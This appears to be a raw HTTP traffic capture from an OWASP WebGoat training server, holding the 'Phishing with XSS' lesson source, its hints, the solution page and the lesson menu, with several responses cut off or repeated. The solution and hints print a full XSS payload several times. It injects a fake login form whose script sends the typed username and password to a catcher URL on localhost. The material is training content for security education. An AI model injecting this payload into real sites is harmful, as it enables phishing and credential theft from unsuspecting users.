+Connection: keep-alive.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+.
+
+package org.owasp.webgoat.plugin;
+
+import java.util.ArrayList;
+import java.util.List;
+import org.apache.ecs.Element;
+import org.apache.ecs.ElementContainer;
+import org.apache.ecs.StringElement;
+import org.apache.ecs.html.B;
+import org.apache.ecs.html.BR;
+import org.apache.ecs.html.Comment;
+import org.apache.ecs.html.H1;
+import org.apache.ecs.html.HR;
+import org.apache.ecs.html.Input;
+import org.apache.ecs.html.TD;
+import org.apache.ecs.html.TH;
+import org.apache.ecs.html.TR;
+import org.apache.ecs.html.Table;
+import org.owasp.webgoat.Catcher;
+import org.owasp.webgoat.lessons.Category;
+import org.owasp.webgoat.lessons.LessonAdapter;
+import org.owasp.webgoat.session.ECSFactory;
+import org.owasp.webgoat.session.WebSession;
+
+
+/***************************************************************************************************
+ * 
+ * 
+ * This file is part of WebGoat, an Open Web Application Security Project utility. For details,
+ * please see http://www.owasp.org/
+ * 
+ * Copyright (c) 2002 - 20014 Bruce Mayhew
+ * 
+ * This program is free software; you can redistribute it and/or modify it under the terms of the
+ * GNU General Public License as published by the Free Software Foundation; either version 2 of the
+ * License, or (at your option) any later version.
+ * 
+ * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
+ * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
+ * General Public License for more details.
+ * 
+ * You should have received a copy of the GNU General Public License along with this program; if
+ * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
+ * 02111-1307, USA.
+ * 
+ * Getting Source ==============
+ * 
+ * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software
+ * projects.
+ * 
+ * For details, please see http://webgoat.github.io
+ * 
+ * @author Bruce Mayhew &lt;a href=&quot;http://code.google.com/p/webgoat&quot;&gt;WebGoat&lt;/a&gt;
+ * @created March 13, 2007
+ */
+public class Phishing extends LessonAdapter
+{
+
+    /**
+     * Description of the Field
+     */
+    protected final static String SEARCH = &quot;Username&quot;;
+    private String searchText;
+
+    /**
+     * Description of the Method
+     * 
+     * @param s
+     *            Description of the Parameter
+     * @return Description of the Return Value
+     */
+    private boolean postedCredentials(WebSession s)
+    {
+        String postedToCookieCatcher = getLessonTracker(s).getLessonProperties().getProperty(Catcher.PROPERTY,
+                                                                                                Catcher.EMPTY_STRING);
+
+        // &lt;Code Section Deliberately Omitted&gt;
+
+            ec.addElement(makeSearch(s));
+            if (postedCredentials(s))
+            {
+                makeSuccess(s);
+            }
+        } catch (Exception e)
+        {
+            s.setMessage(getLabelManager().get(&quot;PhishingErrorGenerating&quot;) + this.getClass().getName());
+        }
+
+        return (ec);
+    }
+
+    protected Element makeSearch(WebSession s)
+    {
+        ElementContainer ec = new ElementContainer();
+
+        ec.addElement(new H1().addElement(getLabelManager().get(&quot;PhishingDialogTitle&quot;)));
+        Table t = new Table().setCellSpacing(0).setCellPadding(2).setBorder(0).setAlign(&quot;center&quot;);
+
+        TR tr = new TR();
+        tr.addElement(new TD().addElement(&quot;&amp;nbsp;&quot;).setColSpan(2));
+        t.addElement(tr);
+        if (s.isColor())
+        {
+            t.setBorder(1);
+        }
+
+        tr = new TR();
+        tr.addElement(new TH().addElement(getLabelManager().get(&quot;PhishingDialogText&quot;)).setColSpan(2)
+                .setAlign(&quot;center&quot;));
+        t.addElement(tr);
+
+        tr = new TR();
+        tr.addElement(new TD().addElement(&quot;&amp;nbsp;&quot;).setColSpan(2));
+        t.addElement(tr);
+
+        TR row1 = new TR();
+        row1.addElement(new TD(new B(new StringElement(getLabelManager().get(&quot;PhishingSearch1&quot;)))).setAlign(&quot;right&quot;));
+
+        Input input1 = new Input(Input.TEXT, SEARCH, searchText);
+        row1.addElement(new TD(input1).setAlign(&quot;left&quot;));
+        t.addElement(row1);
+
+        Element b = ECSFactory.makeButton(getLabelManager().get(&quot;PhishingSearch2&quot;));
+        t.addElement(new TR(new TD(b).setColSpan(2)).setAlign(&quot;center&quot;));
+        ec.addElement(t);
+
+        if (!searchText.equals(&quot;&quot;))
+        {
+            ec.addElement(new BR());
+            ec.addElement(new HR());
+            ec.addElement(new BR());
+            ec.addElement(new StringElement(getLabelManager().get(&quot;PhishingResults&quot;) + searchText));
+            ec.addElement(new Comment(getLabelManager().get(&quot;PhishingSearchResults&quot;)));
+            ec.addElement(new BR());
+            ec.addElement(new BR());
+            ec.addElement(new B(new StringElement(getLabelManager().get(&quot;PhishingNoResults&quot;))));
+            ec.addElement(new Comment(getLabelManager().get(&quot;PhishingEndOfSearchResults&quot;)));
+        }
+
+        return (ec);
+    }
+
+    /**
+     * Gets the hints attribute of the CluesScreen object
+     * 
+     * @return The hints value
+     */
+    protected List&lt;String&gt; getHints(WebSession s)
+    {
+        List&lt;String&gt; hints = new ArrayList&lt;String&gt;();
+        hints.add(getLabelManager().get(&quot;PhishingHint1&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint2&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint3&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint4&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint5&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint6&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint7&quot;));
+        /**
+         * password&lt;script&gt;function hack(){ alert(&quot;Had this been a real attack... Your credentials
+         * were just stolen.\nUser Name = &quot; + document.phish.user.value + &quot;\nPassword = &quot; +
+         * document.phish.pass.value); XSSImage=new Image;
+         * XSSImage.src=&quot;http://localhost:8080/WebGoat/catcher?PROPERTY=yes&amp;user=&quot;
+         * +document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value +
+         * &quot;&quot;;}&lt;/script&gt;&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;
+         * &lt;br&gt;
+         * &lt;HR&gt;
+         * &lt;H3&gt;This feature requires account login:&lt;/H2&gt; &lt;br&gt;
+         * &lt;br&gt;
+         * Enter Username:&lt;br&gt;
+         * &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;
+         * Enter Password:&lt;br&gt;
+         * &lt;input type=&quot;password&quot; name = &quot;pass&quot;&gt;&lt;br&gt;
+         * &lt;input type=&quot;submit&quot; name=&quot;login&quot; 
+
+T 192.168.0.10:8080 -> 192.168.0.100:41069 [A]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+Content-Type: application/json.
+Transfer-Encoding: chunked.
+Date: Thu, 18 Jan 2018 13:02:00 GMT.
+Connection: close.
+.
+10cf.
+[{"hint":"Try adding HTML to the search field to create a fake authentication form, since the form is vulnerable to XSS.<BR> Try to make the form look official.","lesson":"Phishing","number":0},{"hint":"Try: <BR> &lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; name = &quot;pass&quot;&gt;&lt;br&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;","lesson":"Phishing","number":1},{"hint":"Add functionality that can post a request, a button might work<BR><BR>After getting the button on the page, don't forget you will need to steal the credentials and post them to: <BR>http://localhost:8080/WebGoat/capture/PROPERTY=yes&ADD_CREDENTIALS_HERE","lesson":"Phishing","number":2},{"hint":"Try: <BR> &lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot;&gt;<BR><BR>In the whole script:<BR><BR>&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;","lesson":"Phishing","number":3},{"hint":"Make the button perform an action on submit, <BR>adding an onclick=\"hack()\" might work<BR>Don't forget to add the hack() javascript function<BR><BR>In the whole script:<BR><BR>&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;<BR>Also, check firebug. Does the search form need to be terminated for this to work...? (&lt;/form&gt;)","lesson":"Phishing","number":4},{"hint":"You need to create the hack() function.  This function will pull the credentials from the webpage and post them to the WebGoat catcher servlet. <BR><BR> Some useful code snippets:<UL><LI>doucument.phish.user.value - will access the user field<LI>XssImage = new Image(); XssImage.src=SOME_URL = will perform a post<LI>javascript string concatentation uses a \"+\" </UL><BR><BR>The entire javascript portion:<BR><BR>&lt;script&gt;function hack(){ XSSImage=new Image; XSSImage.src=&quot;http://localhost:8080/WebGoat/catcher?PROPERTY=yes&amp;user=&quot;+document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;;alert(&quot;Had this been a real attack... Your credentials were just stolen.\nUser Name = &quot; + document.phish.user.value + &quot;\nPassword = &quot; +  document.phish.pass.value);} &lt;/script&gt;","lesson":"Phishing","number":5},{"hint":"Complete solution for this lesson:<BR><BR>&lt;/form&gt;&lt;script&gt;function hack(){ XSSImage=new Image; XSSImage.src=&quot;http://localhost:8080/WebGoat/catcher?PROPERTY=yes&amp;user=&quot; + document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;;alert(&quot;Had this been a real attack... Your credentials were just stolen.\nUser Name = &quot; + document.phish.user.value + &quot;\nPassword = &quot; +  document.phish.pass.value);} &lt;/script&gt;&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;passw
+
+T 192.168.0.100:80 -> 192.168.33.1:58716 [A]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Thu, 18 Jan 2018 13:02:00 GMT.
+Content-Type: application/json.
+Transfer-Encoding: chunked.
+Connection: keep-alive.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+.
+eec.
+[{"hint":"Try adding HTML to the search field to create a fake authentication form, since the form is vulnerable to XSS.<BR> Try to make the form look official.","lesson":"Phishing","number":0},{"hint":"Try: <BR> &lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; name = &quot;pass&quot;&gt;&lt;br&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;","lesson":"Phishing","number":1},{"hint":"Add functionality that can post a request, a button might work<BR><BR>After getting the button on the page, don't forget you will need to steal the credentials and post them to: <BR>http://localhost:8080/WebGoat/capture/PROPERTY=yes&ADD_CREDENTIALS_HERE","lesson":"Phishing","number":2},{"hint":"Try: <BR> &lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot;&gt;<BR><BR>In the whole script:<BR><BR>&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;","lesson":"Phishing","number":3},{"hint":"Make the button perform an action on submit, <BR>adding an onclick=\"hack()\" might work<BR>Don't forget to add the hack() javascript function<BR><BR>In the whole script:<BR><BR>&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;<BR>Also, check firebug. Does the search form need to be terminated for this to work...? (&lt;/form&gt;)","lesson":"Phishing","number":4},{"hint":"You need to create the hack() function.  This function will pull the credentials from the webpage and post them to the WebGoat catcher servlet. <BR><BR> Some useful code snippets:<UL><LI>doucument.phish.user.value - will acc
+
+T 192.168.0.10:8080 -> 192.168.0.100:41067 [A]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+Content-Type: text/html.
+Content-Length: 4194.
+Date: Thu, 18 Jan 2018 13:02:00 GMT.
+Connection: close.
+.
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+<title>Phising with XSS</title>
+<link rel="stylesheet" type="text/css" href="formate.css">
+</head>
+<body>
+<p><b>Lesson Plan Title:</b> Phishing with XSS</p>
+
+<p><b>Concept / Topic To Teach:</b><br/>
+It is always a good practice to validate all input on the 
+server side. XSS can occur when unvalidated user input is used 
+in an HTTP response. With the help of XSS you can do a Phishing 
+Attack and add content to a page which looks official. It is very 
+hard for a victim to determinate that the content is malicious.
+</p> 
+
+<p><b>General Goal(s):</b><br/>
+The user should be able to add a form asking for username 
+and password. On submit the input should be sent to 
+http://localhost/WebGoat/catcher?PROPERTY=yes&user=catchedUserName&password=catchedPasswordName
+</p>
+
+<b>Solution:</b><br/>
+With XSS it is possible to add further elements to an existing Page.
+This solution consists of two parts you have to combine:
+<ul>
+<li>A form the victim has to fill in</li>
+<li>A script which reads the form and sends the gathered information to the attacker</li>
+</ul>
+A Form with username and password could look like this:<br/>
+<p>
+&lt;/form&gt;&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H3
+&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot;
+name = &quot;pass&quot;&gt;&lt;br&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;
+<br/><br/>Search for this term and you will see that a form is added to the page since the search field accepts HTML.
+<br/>The initial &lt;/form&gt; tag is to terminate the original search form.
+</p>
+Now you need a script:
+<p>
+&lt;script&gt;function hack(){ XSSImage=new Image; XSSImage.src=&quot;<font color="blue">http://localhost/WebGoat/</font>catcher?PROPERTY=yes&amp;user=&quot;+
+document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;; alert(&quot;Had this been a real attack... Your credentials were just stolen.
+User Name = &quot; + document.phish.user.value + &quot;Password = &quot; +  document.phish.pass.value);}
+&lt;/script&gt;
+</p>
+<p>
+This script will read the input from the form and send it to the catcher of WebGoat.<br/>
+The text <font color="blue">in blue</font> should match what is in your address bar. If you are using ports and/or webscarab, it may be different.<br/>
+The last step is to put things together. Add a Button to the form which
+calls the script. You can reach this with the onclick="myFunction()" handler:
+</p>
+<p>
+&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;
+<p>
+The final String looks like this:<br/>
+&lt;/form&gt;&lt;script&gt;function hack(){ XSSImage=new Image; XSSImage.src=&quot;<font color="blue">http://localhost/WebGoat/</font>catcher?PROPERTY=yes&amp;user=&quot;+
+document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;; alert(&quot;Had this been a real attack... Your credentials were just stolen.
+User Name = &quot; + document.phish.user.value + &quot;Password = &quot; +  document.phish.pass.value);}
+&lt;/script&gt;&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H3
+&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot;
+name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;
+</p>
+Search for this String and you will see a form asking for your username and password.
+Fill in these fields and click on the Login Button, which completes the lesson.<br/><br/>
+<img src="plugin_extracted/plugin/Phishing/lessonSolutions/en/Phishing_files/image001.jpg"><br/>
+
+T 192.168.0.100:80 -> 192.168.33.1:58714 [A]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Thu, 18 Jan 2018 13:02:00 GMT.
+Content-Type: text/html.
+Content-Length: 4194.
+Connection: keep-alive.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+.
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+<title>Phising with XSS</title>
+<link rel="stylesheet" type="text/css" href="formate.css">
+</head>
+<body>
+<p><b>Lesson Plan Title:</b> Phishing with XSS</p>
+
+<p><b>Concept / Topic To Teach:</b><br/>
+It is always a good practice to validate all input on the 
+server side. XSS can occur when unvalidated user input is used 
+in an HTTP response. With the help of XSS you can do a Phishing 
+Attack and add content to a page which looks official. It is very 
+hard for a victim to determinate that the content is malicious.
+</p> 
+
+<p><b>General Goal(s):</b><br/>
+The user should be able to add a form asking for username 
+and password. On submit the input should be sent to 
+http://localhost/WebGoat/catcher?PROPERTY=yes&user=catchedUserName&password=catchedPasswordName
+</p>
+
+<b>Solution:</b><br/>
+With XSS it is possible to add further elements to an existing Page.
+This solution consists of two parts you have to combine:
+<ul>
+<li>A form the victim has to fill in</li>
+<li>A script which reads the form and sends the gathered information to the attacker</li>
+</ul>
+A Form with username and password could look like this:<br/>
+<p>
+&lt;/form&gt;&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H3
+&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot;
+name = &quot;pass&quot;&gt;&lt;br&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;
+<br/><br/>Search for this term and you will see that a form is added to the page since the search field accepts HTML.
+<br/>The initial &lt;/form&gt; tag is to terminate the original search form.
+</p>
+Now you need a script:
+<p>
+&lt;script&gt;function hack(){ XSSImage=new Image; XSSImage.src=&quot;<font color="blue">http://localhost/WebGoat/</font>catcher?PROPERTY=yes&amp;user=&quot;+
+document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;; alert(&quot;Had this been a real attack... Your credentials were just stolen.
+User Name = &quot; + document.phish.user.value + &quot;Password = &quot; +  document.phish.pass.value);}
+&lt;/script&gt;
+</p>
+<p>
+This script will read the input from the form and send it to the catcher of WebGoat.<br/>
+The text <font color="blue">in blue</font> should match what is in your address bar. If you are using ports and/or webscarab, it may be different.<br/>
+The last step is to put things together. Add a Button to the form which
+calls the script. You can reach this with the onclick="myFunction()" handler:
+</p>
+<p>
+&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;
+<p>
+The final String looks like this:<br/>
+&lt;/form&gt;&lt;script&gt;function hack(){ XSSImage=new Image; XSSImage.src=&quot;<font color="blue">http://localhost/WebGoat/</font>catcher?PROPERTY=yes&amp;user=&quot;+
+document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;; alert(&quot;Had this been a real attack... Your credentials were just stolen.
+User Name = &quot; + document.phish.user.value + &quot;Password = &quot; +  document.phish.pass.value);}
+&lt;/script&gt;&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H3
+&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot;
+name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;
+</p>
+Search for this String and you will see a form asking for your username and password.
+Fill in these fields and click on the Login Button, which completes the lesson.<br/><br/>
+<img src="plugin_extracted/plugin/Phishing/lessonSolutions/en/Phishing_files/image001.jpg"><br/>
+
+T 192.168.0.10:8080 -> 192.168.0.100:41071 [A]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+Content-Type: application/json.
+Transfer-Encoding: chunked.
+Date: Thu, 18 Jan 2018 13:02:00 GMT.
+Connection: close.
+.
+2000.
+[{"name":"Introduction","type":"CATEGORY","children":[{"name":"How to work with WebGoat","type":"LESSON","children":[],"complete":true,"link":"#attack/360466308/5"},{"name":"How to create a Legacy Lesson","type":"LESSON","children":[],"complete":false,"link":"#attack/1894705151/5"}],"complete":false,"link":null},{"name":"General","type":"CATEGORY","children":[{"name":"Http Basics","type":"LESSON","children":[],"complete":false,"link":"#attack/1869022003/100"}],"complete":false,"link":null},{"name":"Access Control Flaws","type":"CATEGORY","children":[{"name":"Using an Access Control Matrix","type":"LESSON","children":[],"complete":false,"link":"#attack/1708534694/200"},{"name":"Bypass a Path Based Access Control Scheme","type":"LESSON","children":[],"complete":false,"link":"#attack/231255157/200"},{"name":"LAB: Role Based Access Control","type":"LESSON","children":[{"name":"Stage 1: Bypass Business Layer Access Control","type":"STAGE","children":[],"complete":false,"link":"#attack/160587164/200/1"},{"name":"Stage 2: Add Business Layer Access Control","type":"STAGE","children":[],"complete":false,"link":"#attack/160587164/200/2"},{"name":"Stage 3: Bypass Data Layer Access Control","type":"STAGE","children":[],"complete":false,"link":"#attack/160587164/200/3"},{"name":"Stage 4: Add Data Layer Access Control","type":"STAGE","children":[],"complete":false,"link":"#attack/160587164/200/4"}],"complete":false,"link":"#attack/160587164/200"}],"complete":false,"link":null},{"name":"AJAX Security","type":"CATEGORY","children":[{"name":"DOM Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/76122667/400"},{"name":"LAB: DOM-Based cross-site scripting","type":"LESSON","children":[],"complete":false,"link":"#attack/2022121558/400"},{"name":"LAB: Client Side Filtering","type":"LESSON","children":[],"complete":false,"link":"#attack/330535848/400"},{"name":"XML Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/2000980640/400"},{"name":"JSON Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/1426618575/400"},{"name":"Silent Transactions Attacks","type":"LESSON","children":[],"complete":false,"link":"#attack/218322538/400"},{"name":"Insecure Client Storage","type":"LESSON","children":[],"complete":false,"link":"#attack/1129417221/400"},{"name":"Dangerous Use of Eval","type":"LESSON","children":[],"complete":false,"link":"#attack/136634854/400"},{"name":"Same Origin Policy Protection","type":"LESSON","children":[],"complete":false,"link":"#attack/1750680855/400"}],"complete":false,"link":null},{"name":"Authentication Flaws","type":"CATEGORY","children":[{"name":"Password Strength","type":"LESSON","children":[],"complete":false,"link":"#attack/1778575388/500"},{"name":"Forgot Password","type":"LESSON","children":[],"complete":false,"link":"#attack/372049154/500"},{"name":"Multi Level Login 1","type":"LESSON","children":[],"complete":false,"link":"#attack/810720179/500"},{"name":"Multi Level Login 2","type":"LESSON","children":[],"complete":false,"link":"#attack/810720180/500"}],"complete":false,"link":null},{"name":"Buffer Overflows","type":"CATEGORY","children":[{"name":"Off-by-One Overflows","type":"LESSON","children":[],"complete":false,"link":"#attack/736032128/600"}],"complete":false,"link":null},{"name":"Code Quality","type":"CATEGORY","children":[{"name":"Discover Clues in the HTML","type":"LESSON","children":[],"complete":false,"link":"#attack/125644239/700"}],"complete":false,"link":null},{"name":"Concurrency","type":"CATEGORY","children":[{"name":"Thread Safety Problems","type":"LESSON","children":[],"complete":false,"link":"#attack/339531107/800"},{"name":"Shopping Cart Concurrency Flaw","type":"LESSON","children":[],"complete":false,"link":"#attack/734491955/800"}],"complete":false,"link":null},{"name":"Cross-Site Scripting (XSS)","type":"CATEGORY","children":[{"name":"Phishing with XSS","type":"LESSON","children":[],"complete":false,"link":"#attack/1382523204/900"},{"name":"Stored XSS Attacks","type":"LESSON","children":[],"complete":false,"link":"#attack/598569451/900"},{"name":"LAB: Cross Site Scripting","type":"LESSON","children":[{"name":"Stage 1: Stored XSS","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/1"},{"name":"Stage 2: Block Stored XSS using Input Validation","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/2"},{"name":"Stage 3: Stored XSS Revisited","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/3"},{"name":"Stage 4: Block Stored XSS using Output Encoding","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/4"},{"name":"Stage 5: Reflected XSS","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/5"},{"name":"Stage 6: Block Reflected XSS","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/6"}],"complete":false,"link":"#attack/611366032/900"},{"name":"Reflected XSS Attacks","type":"LESSON","children":[],"complete":false,"link":"#attack/1406352188/900"},{"name":"Cross Site Request Forgery (CSRF)","type":"LESSON","children":[],"complete":false,"link":"#attack/2078372/900"},{"name":"CSRF Prompt By-Pass","type":"LESSON","children":[],"complete":false,"link":"#attack/1471017872/900"},{"name":"CSRF Token By-Pass","type":"LESSON","children":[],"complete":false,"link":"#attack/803158781/900"},{"name":"HTTPOnly Test","type":"LESSON","children":[],"complete":false,"link":"#attack/68584332/900"}],"complete":false,"link":null},{"name":"Improper Error Handling","type":"CATEGORY","children":[{"name":"Fail Open Authentication Scheme","type":"LESSON","children":[],"complete":false,"link":"#attack/1075773632/1000"}],"complete":false,"link":null},{"name":"Injection Flaws","type":"CATEGORY","children":[{"name":"Command Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/1922448916/1100"},{"name":"Numeric SQL Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/101829144/1100"},{"name":"Log Spoofing","type":"LESSON","children":[],"complete":false,"link":"#attack/1572295549/1100"},{"name":"XPATH Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/882451674/1100"},{"name":"LAB: SQL Injection","type":"LESSON","children":[{"name":"Stage 1: String SQL Injection","type":"STAGE","children":[],"complete":false,"link":"#attack/1537271095/1100/1"},{"name":"Stage 2: Parameterized Query #1","type":"STAGE","children":[],"complete":false,"link":"#attack/1537271095/1100/2"},{"name":"Stage 3: Numeric SQL Injection","type":"STAGE","children":[],"complete":false,"link":"#attack/1537271095/1100/3"},{"name":"Stage 4: Parameterized Query #2","type":"STAGE","children":[],"complete":false,"link":"#attack/1537271095/1100/4"}],"complete":false,"link":"#attack/1537271095/1100"},{"name":"String SQL Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/538385464/1100"},{"name":"Database Backdoors ","type":"LESSON","children":[],"complete":false,"link":"#attack/980912706/1100"},{"name":"Blind Numeric SQL Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/586116895/1100"},{"name":"Blind String SQL Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/1315528047/1100"}],"complete":false,"link":null},{"name":"Denial of Service","type":"CATEGORY","children":[{"name":"ZipBomb","type":"LESSON","children":[],"complete":false,"link":"#attack/1382524227/1200"},{"name":"Denial of Service from Multiple 